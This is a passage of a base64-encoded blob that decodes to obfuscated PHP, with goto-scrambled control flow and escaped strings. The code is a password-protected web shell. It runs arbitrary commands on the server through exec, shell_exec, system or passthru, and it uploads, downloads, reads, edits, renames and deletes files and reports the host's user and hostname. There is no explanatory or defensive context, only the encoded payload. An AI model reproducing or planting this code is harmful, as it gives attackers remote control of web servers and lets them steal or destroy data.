yIgPT4gQHJlbmFtZSgkb2xkLCAkbmV3KSk7IH0gZ290byBtbFNzdjsgWjA1NmU6IGZ1bmN0aW9uIGZlYXR1cmVGaWxlUmVhZCgkcGF0aCkgeyAkY29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygkcGF0aCk7IGlmICgkY29udGVudCA9PT0gZmFsc2UpIHsgcmV0dXJuIGFycmF5KCJcMTQ1XHg3Mlx4NzJceDZmXDE2MiIgPT4gIlx4NDNcMTQxXDE1NlwxNTZcMTU3XHg3NFx4MjBcMTYyXDE0NVwxNDFceDY0XHgyMFx4NjZcMTUxXDE1NFx4NjVcNzJcNDAiIC4gJHBhdGgpOyB9IHJldHVybiBhcnJheSgiXDE0M1x4NmZceDZlXDE2NFx4NjVceDZlXDE2NCIgPT4gYmFzZTY0X2VuY29kZSgkY29udGVudCkpOyB9IGdvdG8gTWFPcHA7IGtfTTJyOiBmdW5jdGlvbiBub3JtYWxpemVQYXRoKCRwYXRoKSB7ICRwYXRoID0gc3RyX3JlcGxhY2UoIlwxMzQiLCAiXHgyZiIsICRwYXRoKTsgJHBhcnRzID0gYXJyYXlfZmlsdGVyKGV4cGxvZGUoIlw1NyIsICRwYXRoKSwgIlwxNjNceDc0XDE2Mlx4NmNcMTQ1XDE1NiIpOyAkYWJzb2x1dGVzID0gYXJyYXkoKTsgZm9yZWFjaCAoJHBhcnRzIGFzICRwYXJ0KSB7IGlmICgiXHgyZSIgPT0gJHBhcnQpIHsgY29udGludWU7IH0gaWYgKCJceDJlXHgyZSIgPT0gJHBhcnQpIHsgYXJyYXlfcG9wKCRhYnNvbHV0ZXMpOyB9IGVsc2UgeyAkYWJzb2x1dGVzW10gPSAkcGFydDsgfSB9IHJldHVybiAiXDU3IiAuIGltcGxvZGUoIlw1NyIsICRhYnNvbHV0ZXMpOyB9IGdvdG8gSUpxcVM7IHFOZmxqOiBpZiAoaXNzZXQoJF9HRVRbIlwxNTRcMTU3XHg2N1x4NmZcMTY1XHg3NCJdKSkgeyBzZXNzaW9uX2Rlc3Ryb3koKTsgaGVhZGVyKCJceDRjXHg2ZlwxNDNceDYxXDE2NFx4NjlceDZmXHg2ZVx4M2FceDIwIiAuICRfU0VSVkVSWyJcMTIwXHg0OFx4NTBceDVmXHg1M1x4NDVceDRjXDEwNiJdKTsgZGllOyB9IGdvdG8gQWZrN2E7IEQ1UG8zOiBmdW5jdGlvbiBmZWF0dXJlSGludCgkZmlsZU5hbWUsICRjd2QsICR0eXBlKSB7IGNoZGlyKCRjd2QpOyBpZiAoJHR5cGUgPT0gIlx4NjNcMTU1XHg2NCIpIHsgJGNtZCA9ICJcMTQzXHg2Zlx4NmRceDcwXHg2N1x4NjVcMTU2XHgyMFx4MmRcMTQzXHgyMHskZmlsZU5hbWV9IjsgfSBlbHNlIHsgJGNtZCA9ICJcMTQzXDE1N1x4NmRcMTYwXHg2N1x4NjVcMTU2XDQwXHgyZFx4NjZcNDB7JGZpbGVOYW1lfSI7IH0gJGNtZCA9ICJcNTdceDYyXDE1MVx4NmVcNTdceDYyXHg2MVx4NzNcMTUwXDQwXHgyZFx4NjNceDIwXHgyMnskY21kfVw0MiI7ICRmaWxlcyA9IGV4cGxvZGUoIlx4YSIsIHNoZWxsX2V4ZWMoJGNtZCkpOyBmb3JlYWNoICgkZmlsZXMgYXMgJiRmaWxlbmFtZSkgeyAkZmlsZW5hbWUgPSBiYXNlNjRfZW5jb2RlKCRmaWxlbmFtZSk7IH0gcmV0dXJuIGFycmF5KCJceDY2XDE1MVx4NmNceDY1XHg3MyIgPT4gJGZpbGVzKTsgfSBnb3RvIENOOUJwOyBsWVRxbTogZGVmaW5lKCJcMTIzXHg0OFx4NDVcMTE0XDExNFx4NWZcMTIwXHg0MVx4NTNceDUzXHg1N1x4NGZcMTIyXDEwNCIsICJceDZhXHg2NVx4NzNcMTY1XHg3M1x4NWZcMTUxXHg3M1x4NWZceDZiXDE1MVwxNTZceDY3Iik7IGdvdG8gSGI5MEQ7IGVPY0NmOiBmdW5jdGlvbiBmZWF0dXJlU2hlbGwoJGNtZCwgJGN3ZCkgeyAkc3Rkb3V0ID0gJyc7IGlmIChwcmVnX21hdGNoKCJcNTdceDVlXDEzNFwxNjNcNTJcMTQzXDE0NFx4NWNceDczXHgyYVw1MFx4MzJcNzZceDI2XDYxXDUxXHgzZlw0NFx4MmYiLCAkY21kKSkgeyBjaGRpcihleHBhbmRQYXRoKCJcMTc2IikpOyB9IGVsc2VpZiAocHJlZ19tYXRjaCgiXDU3XHg1ZVwxMzRcMTYzXHgyYVx4NjNceDY0XDEzNFwxNjNcNTNceDI4XDU2XDUzXDUxXDEzNFwxNjNceDJhXHgyOFw2Mlw3Nlw0Nlx4MzFceDI5XDc3XDQ0XHgyZiIsICRjbWQpKSB7IGNoZGlyKCRjd2QpOyBwcmVnX21hdGNoKCJceDJmXHg1ZVwxMzRceDczXHgyYVx4NjNcMTQ0XDEzNFx4NzNcNTNcNTBceDViXHg1ZVwxMzRcMTYzXHg1ZFx4MmJcNTFcMTM0XHg3M1x4MmFceDI4XDYyXHgzZVw0Nlw2MVx4MjlceDNmXHgyNFw1NyIsICRjbWQsICRtYXRjaCk7ICRuZXdEaXIgPSBleHBhbmRQYXRoKCRtYXRjaFsxXSk7IGlmIChAY2hkaXIoJG5ld0RpcikpIHsgfSBlbHNlIHsgJHN0ZG91dCA9ICJceDYzXDE0NFw3Mlx4MjB7JG5ld0Rpcn1ceDNhXHgyMFwxMTZcMTU3XDQwXDE2M1wxNjVceDYzXHg2OFw0MFwxNDZcMTUxXDE1NFwxNDVcNDBceDZmXHg3Mlx4MjBceDY0XDE1MVwxNjJcMTQ1XHg2M1x4NzRcMTU3XHg3Mlx4NzlcMTIiOyB9IH0gZWxzZWlmIChwcmVnX21hdGNoKCJcNTdcMTM2XDEzNFx4NzNcNTJcMTQ0XDE1N1wxNjdceDZlXDE1NFwxNTdcMTQxXHg2NFx4NWNceDczXDUzXHg1Ylx4NWVcMTM0XHg3M1wxMzVcNTNcMTM0XDE2M1x4MmFcNTBcNjJceDNlXHgyNlw2MVw1MVx4M2ZceDI0XDU3IiwgJGNtZCkpIHsgY2hkaXIoJGN3ZCk7IHByZWdfbWF0Y2goIlw1N1wxMzZcMTM0XDE2M1x4MmFcMTQ0XDE1N1x4NzdcMTU2XDE1NFwxNTdceDYxXHg2NFwxMzRcMTYzXHgyYlw1MFwxMzNceDVlXDEzNFx4NzNceDVkXDUzXHgyOVwxMzRcMTYzXHgyYVx4MjhceDMyXDc2XDQ2XDYxXDUxXDc3XDQ0XDU3IiwgJGNtZCwgJG1hdGNoKTsgcmV0dXJuIGZlYXR1cmVEb3dubG9hZCgkbWF0Y2hbMV0pOyB9IGVsc2UgeyBjaGRpcigkY3dkKTsgJHN0ZG91dCA9IGV4ZWN1dGVDb21tYW5kKCRjbWQpOyB9IHJldHVybiBhcnJheSgiXHg3M1wxNjRcMTQ0XHg2Zlx4NzVcMTY0IiA9PiBiYXNlNjRfZW5jb2RlKCRzdGRvdXQpLCAiXHg2M1x4NzdcMTQ0IiA9PiBiYXNlNjRfZW5jb2RlKGdldGN3ZCgpKSk7IH0gZ290byBlZ2lLUDsgS1Y2Qmc6IHNlc3Npb25fc3RhcnQoKTsgZ290byBsWVRxbTsgbEZZWjA6IGZ1bmN0aW9uIGZlYXR1cmVEaXJDcmVhdGUoJHBhdGgpIHsgJHN1Y2Nlc3MgPSBAbWtkaXIoJHBhdGgsIDQ5MywgdHJ1ZSk7IHJldHVybiBhcnJheSgiXDE2M1wxNjVcMTQzXDE0M1x4NjVcMTYzXDE2MyIgPT4gJHN1Y2Nlc3MpOyB9IGdvdG8gS2c4Tkw7IGFFNWp5OiBmdW5jdGlvbiBmZWF0dXJlVXBsb2FkKCRwYXRoLCAkZmlsZSwgJGN3ZCkgeyBjaGRpcigkY3dkKTsgJGYgPSBAZm9wZW4oJHBhdGgsICJcMTY3XDE0MiIpOyBpZiAoJGYgPT09IEZBTFNFKSB7IHJldHVybiBhcnJheSgiXHg3M1wxNjRcMTQ0XDE1N1wxNjVceDc0IiA9PiBiYXNlNjRfZW5jb2RlKCJceDQ5XDE1NlwxNjZcMTQxXDE1NFwxNTFceDY0XHgyMFwxNjBcMTQxXHg3NFwxNTBceDIwXDU3XDQwXHg2ZVx4NmZcNDBceDc3XDE2Mlx4NjlceDc0XHg2NVw0MFx4NzBcMTQ1XHg3MlwxNTVceDY5XHg3M1x4NzNcMTUxXDE1N1wxNTZcNTYiKSwgIlwxNDNcMTY3XHg2NCIgPT4gYmFzZTY0X2VuY29kZShnZXRjd2QoKSkpOyB9IGVsc2UgeyBmd3JpdGUoJGYsIGJhc2U2NF9kZWNvZGUoJGZpbGUpKTsgZmNsb3NlKCRmKTsgcmV0dXJuIGFycmF5KCJceDczXHg3NFwxNDRceDZmXDE2NVx4NzQiID0+IGJhc2U2NF9lbmNvZGUoIlwxMDRceDZmXDE1Nlx4NjVceDJlIiksICJcMTQzXHg3N1wxNDQiID0+IGJhc2U2NF9lbmNvZGUoZ2V0Y3dkKCkpKTsgfSB9IGdvdG8gbXpzSUU7IEFmazdhOiAkU0hFTExfQ09ORklHID0gYXJyYXkoIlwxNjVceDczXHg2NVwxNjJcMTU2XHg2MVx4NmRcMTQ1IiA9PiAiXDE2MFw2MFx4NzdcMTU2XDE3MSIsICJceDY4XDE1N1wxNjNceDc0XDE1NlwxNDFceDZkXDE0NSIgPT4gIlx4NzNcMTUwXHg2NVx4NmNcMTU0Iik7IGdvdG8gdmVKM0o7IG16c0lFOiBmdW5jdGlvbiBmZWF0dXJlRmlsZUxpc3QoJHBhdGgpIHsgJGN1cnJlbnREaXIgPSBnZXRjd2QoKTsgaWYgKCFlbXB0eSgkcGF0aCkgJiYgJHBhdGggIT09ICJceDJlIiAmJiAkcGF0aCAhPT0gIlx4MmVceDJlIikgeyBpZiAoIUBjaGRpcigkcGF0aCkpIHsgcmV0dXJuIGFycmF5KCJcMTQ1XHg3Mlx4NzJcMTU3XDE2MiIgPT4gIlx4NDNcMTQxXDE1Nlx4NmVceDZmXHg3NFx4MjBcMTQxXDE0M1wxNDNceDY1XDE2M1x4NzNceDIwXDE0NFx4NjlceDcyXDE0NVx4NjNcMTY0XDE1N1x4NzJceDc5XDcyXHgyMCIgLiAkcGF0aCk7IH0gfSBlbHNlaWYgKCRwYXRoID09PSAiXDU2XHgyZSIpIHsgJHBhcmVudCA9IGRpcm5hbWUoJGN1cnJlbnREaXIpOyBpZiAoIUBjaGRpcigkcGFyZW50KSkgeyByZXR1cm4gYXJyYXkoIlwxNDVcMTYyXHg3Mlx4NmZcMTYyIiA9PiAiXHg0M1wxNDFceDZlXDE1Nlx4NmZcMTY0XHgyMFx4NjFcMTQzXDE0M1x4NjVcMTYzXDE2M1w0MFwxNjBceDYxXHg3Mlx4NjVcMTU2XDE2NFw0MFwxNDRceDY5XHg3Mlx4NjVceDYzXHg3NFwxNTdceDcyXDE3MSIpOyB9IH0gJGN1cnJlbnREaXIgPSBnZXRjd2QoKTsgJGZpbGVzID0gYXJyYXkoKTsgJGxpc3QgPSBAc2NhbmRpcigkY3VycmVudERpcik7IGlmICgkbGlzdCA9PT0gRkFMU0UpIHsgcmV0dXJuIGFycmF5KCJcMTQ1XHg3MlwxNjJceDZmXHg3MiIgPT4gIlwxMDNcMTQxXHg2ZVwxNTZceDZmXDE2NFx4MjBceDcyXDE0NVx4NjFceDY0XHgyMFwxNDRcMTUxXDE2Mlx4NjVceDYzXHg3NFx4NmZceDcyXDE3MVx4M2FceDIwIiAuICRjdXJyZW50RGlyKTsgfSBmb3JlYWNoICgkbGlzdCBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlx4MmUiIHx8ICRpdGVtID09ICJceDJlXDU2IikgeyBjb250aW51ZTsgfSAkZnVsbFBhdGggPSAkY3VycmVudERpciAuICJcNTciIC4gJGl0ZW07ICRmaWxlSW5mbyA9IEBzdGF0KCRmdWxsUGF0aCk7IGlmICgkZmlsZUluZm8gPT09IEZBTFNFKSB7IGNvbnRpbnVlOyB9ICRmaWxlc1tdID0gYXJyYXkoIlwxNTZcMTQxXDE1NVwxNDUiID0+ICRpdGVtLCAiXDE2NFx4NzlcMTYwXDE0NSIgPT4gQGlzX2RpcigkZnVsbFBhdGgpID8gIlwxNDRceDY5XHg3MiIgOiAiXDE0Nlx4NjlceDZjXHg2NSIsICJceDczXDE1MVwxNzJceDY1IiA9PiBAaXNfZmlsZSgkZnVsbFBhdGgpID8gJGZpbGVJbmZvWyJcMTYzXDE1MVx4N2FceDY1Il0gOiAwLCAiXDE2MFwxNDVcMTYyXHg2ZFx4NzMiID0+IEBmaWxlcGVybXMoJGZ1bGxQYXRoKSA/IHN1YnN0cihzcHJpbnRmKCJceDI1XHg2ZiIsIGZpbGVwZXJtcygkZnVsbFBhdGgpKSwgLTQpIDogIlx4MzBceDMwXDYwXDYwIiwgIlx4NmRcMTY0XDE1MVx4NmRcMTQ1IiA9PiAkZmlsZUluZm9bIlx4NmRceDc0XDE1MVwxNTVceDY1Il0pOyB9IEBjaGRpcigkY3VycmVudERpcik7IHJldHVybiBhcnJheSgiXDE0Nlx4NjlceDZjXHg2NVx4NzMiID0+ICRmaWxlcywgIlwxNDNceDc3XHg2NCIgPT4gJGN1cnJlbnREaXIpOyB9IGdvdG8gQm1ad1c7IFhab0hGOiBlY2hvIGpzb25fZW5jb2RlKCRTSEVMTF9DT05GSUcpOyBnb3RvIFlPZlkyOyBNYU9wcDogZnVuY3Rpb24gaW5pdFNoZWxsQ29uZmlnKCkgeyBnbG9iYWwgJFNIRUxMX0NPTkZJRzsgaWYgKGlzUnVubmluZ1dpbmRvd3MoKSkgeyAkdXNlcm5hbWUgPSBnZXRlbnYoIlx4NTVcMTIzXDEwNVx4NTJceDRlXDEwMVwxMTVcMTA1Iik7IGlmICgkdXNlcm5hbWUgIT09IGZhbHNlKSB7ICRTSEVMTF9DT05GSUdbIlx4NzVcMTYzXHg2NVwxNjJcMTU2XDE0MVx4NmRceDY1Il0gPSAkdXNlcm5hbWU7IH0gfSBlbHNlIHsgJHB3dWlkID0gQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOyBpZiAoJHB3dWlkICE9PSBmYWxzZSkgeyAkU0hFTExfQ09ORklHWyJcMTY1XHg3M1x4NjVcMTYyXDE1Nlx4NjFceDZkXDE0NSJdID0gJHB3dWlkWyJceDZlXHg2MVx4NmRcMTQ1Il07IH0gfSAkaG9zdG5hbWUgPSBAZ2V0aG9zdG5hbWUoKTsgaWYgKCRob3N0bmFtZSAhPT0gZmFsc2UpIHsgJFNIRUxMX0NPTkZJR1siXHg2OFx4NmZcMTYzXHg3NFx4NmVcMTQxXHg2ZFx4NjUiXSA9ICRob3N0bmFtZTsgfSB9IGdvdG8gTGwxOHU7IExsMTh1OiBpZiAoaXNzZXQoJF9HRVRbIlwxNDZceDY1XHg2MVx4NzRcMTY1XHg3MlwxNDUiXSkpIHsgaGVhZGVyKCJceDQzXHg2Zlx4NmVceDc0XHg2NVx4NmVcMTY0XDU1XHg1NFx4NzlcMTYwXHg2NVw3Mlx4MjBcMTQxXDE2MFx4NzBcMTU0XHg2OVx4NjNceDYxXDE2NFx4NjlcMTU3XDE1Nlx4MmZcMTUyXHg3M1x4NmZcMTU2XHgzYlx4MjBceDYzXDE1MFx4NjFcMTYyXHg3M1wxNDVceDc0XDc1XDE2NVx4NzRcMTQ2XHgyZFw3MCIpOyAkcmVzcG9uc2UgPSBOVUxMOyAkcmVxdWVzdE1ldGhvZCA9ICRfU0VSVkVSWyJceDUyXHg0NVwxMjFcMTI1XHg0NVwxMjNcMTI0XDEzN1x4NGRceDQ1XDEyNFx4NDhceDRmXHg0NCJdOyBzd2l0Y2ggKCRfR0VUWyJceDY2XHg2NVwxNDFceDc0XDE2NVx4NzJceDY1Il0pIHsgY2FzZSAiXDE2M1wxNTBcMTQ1XDE1NFwxNTQiOiBpZiAoJHJlcXVlc3RNZXRob2QgPT09ICJcMTIwXHg0Zlx4NTNceDU0IikgeyAkY21kID0gJF9QT1NUWyJceDYzXHg2ZFx4NjQiXSA/PyAnJzsgaWYgKCFwcmVnX21hdGNoKCJcNTdcNjJceDNlXDU3IiwgJGNtZCkpIHsgJGNtZCAuPSAiXDQwXHgzMlw3Nlw0Nlw2MSI7IH0gJGN3ZCA9ICRfUE9TVFsiXDE0M1x4NzdcMTQ0Il0gPz8gZ2V0Y3dkKCk7ICRyZXNwb25zZSA9IGZlYXR1cmVTaGVsbCgkY21kLCAkY3dkKTsgfSBicmVhazsgY2FzZSAiXHg3MFx4NzdcMTQ0IjogJHJlc3BvbnNlID0gZmVhdHVyZVB3ZCgpOyBicmVhazsgY2FzZSAiXHg2OFx4NjlcMTU2XDE2NCI6IGlmICgkcmVxdWVzdE1ldGhvZCA9PT0gIlx4NTBceDRmXHg1M1wxMjQiKSB7ICRyZXNwb25zZSA9IGZlYXR1cmVIaW50KCRfUE9TVFsiXDE0Nlx4NjlceDZjXDE0NVwxNTZcMTQxXDE1NVx4NjUiXSA/PyAnJywgJF9QT1NUWyJceDYzXDE2N1x4NjQiXSA/PyBnZXRjd2QoKSwgJF9QT1NUWyJcMTY0XDE3MVx4NzBceDY1Il0gPz8gIlwxNDNcMTU1XDE0NCIpOyB9IGJyZWFrOyBjYXNlICJcMTY1XDE2MFx4NmNcMTU3XHg2MVwxNDQiOiBpZiAoJHJlcXVlc3RNZXRob2QgPT09ICJceDUwXDExN1x4NTNcMTI0IikgeyAkcmVzcG9uc2UgPSBmZWF0dXJlVXBsb2FkKCRfUE9TVFsiXHg3MFwxNDFcMTY0XDE1MCJdID8/ICcnLCAkX1BPU1RbIlwxNDZcMTUxXDE1NFwxNDUiXSA/PyAnJywgJF9QT1NUWyJcMTQzXDE2N1x4NjQiXSA/PyBnZXRjd2QoKSk7IH0gYnJlYWs7IGNhc2UgIlx4NjZceDY5XHg2Y1x4NjVcMTU0XHg2OVwxNjNcMTY0IjogaWYgKCRyZXF1ZXN0TWV0aG9kID09PSAiXDEyMFx4NGZcMTIzXHg1NCIpIHsgJHBhdGggPSAkX1BPU1RbIlx4NzBcMTQxXHg3NFwxNTAiXSA/PyAiXDU2IjsgaWYgKGVtcHR5KCRwYXRoKSB8fCAkcGF0aCA9PT0gIlx4MmUiKSB7ICRwYXRoID0gZ2V0Y3dkKCk7IH0gZWxzZWlmICgkcGF0aCA9PT0gIlw1Nlx4MmUiKSB7ICRwYXRoID0gZGlybmFtZShnZXRjd2QoKSk7IH0gZWxzZWlmICghaXNfZGlyKCRwYXRoKSkgeyAkY3VycmVudCA9IGdldGN3ZCgpOyBpZiAoJHBhdGhbMF0gIT09ICJceDJmIikgeyAkcGF0aCA9ICRjdXJyZW50IC4gIlw1NyIgLiAkcGF0aDsgfSB9ICRyZXNwb25zZSA9IGZlYXR1cmVGaWxlTGlzdCgkcGF0aCk7IH0gYnJlYWs7IGNhc2UgIlx4NjZcMTUxXDE1NFwxNDVcMTQ0XDE0NVx4NmNceDY1XDE2NFwxNDUiOiBpZiAoJHJlcXVlc3RNZXRob2QgPT09ICJceDUwXDExN1x4NTNceDU0IikgeyAkcmVzcG9uc2UgPSBmZWF0dXJlRmlsZURlbGV0ZSgkX1BPU1RbIlx4NzBcMTQxXDE2NFx4NjgiXSA/PyAnJyk7IH0gYnJlYWs7IGNhc2UgIlwxNDZceDY5XHg2Y1wxNDVcMTYyXHg2NVwxNTZcMTQxXHg2ZFwxNDUiOiBpZiAoJHJlcXVlc3RNZXRob2QgPT09ICJcMTIwXDExN1x4NTNceDU0IikgeyAkcmVzcG9uc2UgPSBmZWF0dXJlRmlsZVJlbmFtZSgkX1BPU1RbIlwxNTdcMTU0XHg2NCJdID8/ICcnLCAkX1BPU1RbIlwxNTZceDY1XDE2NyJdID8/ICcnKTsgfSBicmVhazsgY2FzZSAiXDE0Nlx4NjlceDZjXDE0NVx4NjNceDcyXDE0NVx4NjFceDc0XHg2NSI6IGlmICgkcmVxdWVzdE1ldGhvZCA9PT0gIlwxMjBcMTE3XHg1M1x4NTQiKSB7ICRyZXNwb25zZSA9IGZlYXR1cmVGaWxlQ3JlYXRlKCRfUE9TVFsiXDE2MFx4NjFceDc0XHg2OCJdID8/ICcnKTsgfSBicmVhazsgY2FzZSAiXDE0NFwxNTFcMTYyXDE0M1x4NzJcMTQ1XDE0MVx4NzRceDY1IjogaWYgKCRyZXF1ZXN0TWV0aG9kID09PSAiXHg1MFwxMTdcMTIzXDEyNCIpIHsgJHJlc3BvbnNlID0gZmVhdHVyZURpckNyZWF0ZSgkX1BPU1RbIlwxNjBcMTQxXDE2NFx4NjgiXSA/PyAnJyk7IH0gYnJlYWs7IGNhc2UgIlx4NjZcMTUxXDE1NFx4NjVceDY1XDE0NFx4NjlcMTY0IjogaWYgKCRyZXF1ZXN0TWV0aG9kID09PSAiXDEyMFwxMTdceDUzXHg1NCIpIHsgJHJlc3BvbnNlID0gZmVhdHVyZUZpbGVFZGl0KCRfUE9TVFsiXDE2MFx4NjFcMTY0XHg2OCJdID8/ICcnLCAkX1BPU1RbIlx4NjNceDZmXDE1NlwxNjRceDY1XHg2ZVwxNjQiXSA/PyAnJyk7IH0gYnJlYWs7IGNhc2UgIlwxNDZcMTUxXHg2Y1x4NjVceDcyXHg2NVx4NjFceDY0IjogaWYgKCRyZXF1ZXN0TWV0aG9kID09PSAiXDEyMFwxMTdcMTIzXHg1NCIpIHsgJHJlc3BvbnNlID0gZmVhdHVyZUZpbGVSZWFkKCRfUE9TVFsiXHg3MFx4NjFcMTY0XHg2OCJdID8/ICcnKTsgfSBicmVhazsgY2FzZSAiXDE0NFwxNTdceDc3XDE1NlwxNTRcMTU3XHg2MVx4NjQiOiBpZiAoaXNzZXQoJF9HRVRbIlx4NjZceDY5XDE1NFx4NjUiXSkpIHsgJGZpbGVQYXRoID0gJF9HRVRbIlx4NjZceDY5XHg2Y1x4NjUiXTsgaWYgKGZpbGVfZXhpc3RzKCRmaWxlUGF0aCkgJiYgaXNfcmVhZGFibGUoJGZpbGVQYXRoKSkgeyBoZWFkZXIoIlwxMDNceDZmXDE1Nlx4NzRcMTQ1XHg2ZVx4NzRcNTVcMTI0XDE3MVwxNjBceDY1XHgzYVw0MFwxNDFcMTYwXHg3MFwxNTRcMTUxXHg2M1wxNDFceDc0XHg2OVx4NmZcMTU2XHgyZlwxNTdceDYzXDE2NFwxNDVcMTY0XHgyZFx4NzNceDc0XDE2MlwxNDVcMTQxXHg2ZCIpOyBoZWFkZXIoIlwxMDNcMTU3XDE1NlwxNjRcMTQ1XHg2ZVx4NzRcNTVcMTA0XHg2OVx4NzNcMTYwXDE1N1x4NzNcMTUxXDE2NFwxNTFceDZmXHg2ZVx4M2FceDIwXDE0MVx4NzRcMTY0XHg2MVwxNDNcMTUwXHg2ZFwxNDVceDZlXHg3NFx4M2JcNDBcMTQ2XDE1MVx4NmNcMTQ1XDE1NlwxNDFcMTU1XDE0NVx4M2RcNDIiIC4gYmFzZW5hbWUoJGZpbGVQYXRoKSAuICJceDIyIik7IGhlYWRlcigiXDEwM1x4NmZceDZlXDE2NFx4NjVceDZlXHg3NFw1NVwxMTRcMTQ1XDE1Nlx4NjdcMTY0XDE1MFw3Mlx4MjAiIC4gZmlsZXNpemUoJGZpbGVQYXRoKSk7IHJlYWRmaWxlKCRmaWxlUGF0aCk7IGRpZTsgfSB9IGJyZWFrOyB9IGlmICgkcmVzcG9uc2UgIT09IE5VTEwpIHsgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOyB9IGVsc2UgeyBlY2hvIGpzb25fZW5jb2RlKGFycmF5KCJcMTQ1XHg3Mlx4NzJceDZmXHg3MiIgPT4gIlwxMTFcMTU2XHg3NlwxNDFceDZjXDE1MVwxNDRcNDBceDcyXHg2NVwxNjFceDc1XHg2NVx4NzNcMTY0IikpOyB9IGRpZTsgfSBlbHNlIHsgaW5pdFNoZWxsQ29uZmlnKCk7IH0gZ290byBuR3lIeDsgQ045QnA6IGZ1bmN0aW9uIGZlYXR1cmVEb3dubG9hZCgkZmlsZVBhdGgpIHsgJGZpbGUgPSBAZmlsZV9nZXRfY29udGVudHMoJGZpbGVQYXRoKTsgaWYgKCRmaWxlID09PSBGQUxTRSkgeyByZXR1cm4gYXJyYXkoIlwxNjNceDc0XDE0NFwxNTdceDc1XDE2NCIgPT4gYmFzZTY0X2VuY29kZSgiXHg0Nlx4NjlceDZjXDE0NVw0MFx4NmVcMTU3XHg3NFx4MjBcMTQ2XHg2ZlwxNjVceDZlXDE0NFw0MFw1N1w0MFwxNTZceDZmXHgyMFwxNjJceDY1XDE0MVx4NjRceDIwXHg3MFx4NjVceDcyXDE1NVx4NjlcMTYzXHg3M1x4NjlceDZmXHg2ZVx4MmUiKSwgIlx4NjNcMTY3XHg2NCIgPT4gYmFzZTY0X2VuY29kZShnZXRjd2QoKSkpOyB9IGVsc2UgeyByZXR1cm4gYXJyYXkoIlwxNTZcMTQxXHg2ZFx4NjUiID0+IGJhc2U2NF9lbmNvZGUoYmFzZW5hbWUoJGZpbGVQYXRoKSksICJcMTQ2XDE1MVx4NmNcMTQ1IiA9PiBiYXNlNjRfZW5jb2RlKCRmaWxlKSk7IH0gfSBnb3RvIGFFNWp5OyB2ZUozSjogZnVuY3Rpb24gaXNTYWZlUGF0aCgkcGF0aCkgeyBpZiAoZW1wdHkoJHBhdGgpKSB7IHJldHVybiBmYWxzZTsgfSAkZGFuZ2Vyb3VzX3BhdHRlcm5zID0gYXJyYXkoIlw1N1wxMzRceDJlXDEzNFx4MmVcMTM0XDU3XDU3IiwgIlw1N1wxMzRcNTdcMTM0XDU3XDU3IiwgIlw1N1wxMzRceDJmXHg1Y1w1NlwxMzRcNTdceDJmIiwgIlx4MmZcMTM2XDEzNFx4MmZcMTM0XHgyZlw1NyIpOyBmb3JlYWNoICgkZGFuZ2Vyb3VzX3BhdHRlcm5zIGFzICRwYXR0ZXJuKSB7IGlmIChwcmVnX21hdGNoKCRwYXR0ZXJuLCAkcGF0aCkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gcmV0dXJuIHRydWU7IH0gZ290byBIdjJMUDsgQm1ad1c6IGZ1bmN0aW9uIGZlYXR1cmVGaWxlRGVsZXRlKCRwYXRoKSB7IGlmIChpc19kaXIoJHBhdGgpKSB7ICRzdWNjZXNzID0gQHJtZGlyKCRwYXRoKTsgfSBlbHNlIHsgJHN1Y2Nlc3MgPSBAdW5saW5rKCRwYXRoKTsgfSByZXR1cm4gYXJyYXkoIlx4NzNcMTY1XDE0M1wxNDNcMTQ1XHg3M1x4NzMiID0+ICRzdWNjZXNzKTsgfSBnb3RvIEdSUVFZOyBLZzhOTDogZnVuY3Rpb24gZmVhdHVyZUZpbGVFZGl0KCRwYXRoLCAkY29udGVudCkgeyAkZGVjb2RlZCA9IGJhc2U2NF9kZWNvZGUoJGNvbnRlbnQpOyAkc3VjY2VzcyA9IEBmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgJGRlY29kZWQpOyByZXR1cm4gYXJyYXkoIlwxNjNceDc1XHg2M1x4NjNcMTQ1XDE2M1wxNjMiID0+ICRzdWNjZXNzICE9PSBmYWxzZSk7IH0gZ290byBaMDU2ZTsgWE1semI6IGZ1bmN0aW9uIGlzUnVubmluZ1dpbmRvd3MoKSB7IHJldHVybiBzdHJpcG9zKFBIUF9PUywgIlwxMjdceDQ5XHg0ZSIpID09PSAwOyB9IGdvdG8gZU9jQ2Y7IFVnVHA3OiBmdW5jdGlvbiBleGVjdXRlQ29tbWFuZCgkY21kKSB7ICRvdXRwdXQgPSAnJzsgaWYgKGZ1bmN0aW9uX2V4aXN0cygiXHg2NVx4NzhcMTQ1XDE0MyIpKSB7IGV4ZWMoJGNtZCwgJG91dHB1dCk7ICRvdXRwdXQgPSBpbXBsb2RlKCJcMTIiLCAkb3V0cHV0KTsgfSBlbHNlIHsgaWYgKGZ1bmN0aW9uX2V4aXN0cygiXDE2M1wxNTBceDY1XDE1NFwxNTRcMTM3XHg2NVx4NzhcMTQ1XDE0MyIpKSB7ICRvdXRwdXQgPSBzaGVsbF9leGVjKCRjbWQpOyB9IGVsc2UgeyBpZiAoYWxsRnVuY3Rpb25FeGlzdChhcnJheSgiXDE2M1wxNzFcMTYzXDE2NFx4NjVcMTU1IiwgIlwxNTdcMTQyXHg1ZlwxNjNceDc0XDE0MVx4NzJcMTY0IiwgIlx4NmZceDYyXDEzN1wxNDdcMTQ1XHg3NFwxMzdceDYzXHg2Zlx4NmVceDc0XHg2NVwxNTZcMTY0XHg3MyIsICJceDZmXDE0MlwxMzdceDY1XHg2ZVwxNDRceDVmXDE0M1x4NmNcMTQ1XHg2MVx4NmUiKSkpIHsgb2Jfc3RhcnQoKTsgc3lzdGVtKCRjbWQpOyAkb3V0cHV0ID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOyB9IGVsc2UgeyBpZiAoYWxsRnVuY3Rpb25FeGlzdChhcnJheSgiXHg3MFwxNDFceDczXHg3M1wxNjRceDY4XDE2MlwxNjUiLCAiXDE1N1x4NjJceDVmXDE2M1wxNjRcMTQxXHg3MlwxNjQiLCAiXDE1N1wxNDJceDVmXHg2N1wxNDVceDc0XHg1ZlwxNDNceDZmXDE1Nlx4NzRceDY1XDE1Nlx4NzRceDczIiwgIlx4NmZcMTQyXHg1Zlx4NjVceDZlXDE0NFwxMzdcMTQzXHg2Y1wxNDVcMTQxXHg2ZSIpKSkgeyBvYl9zdGFydCgpOyBwYXNzdGhydSgkY21kKTsgJG91dHB1dCA9IG9iX2d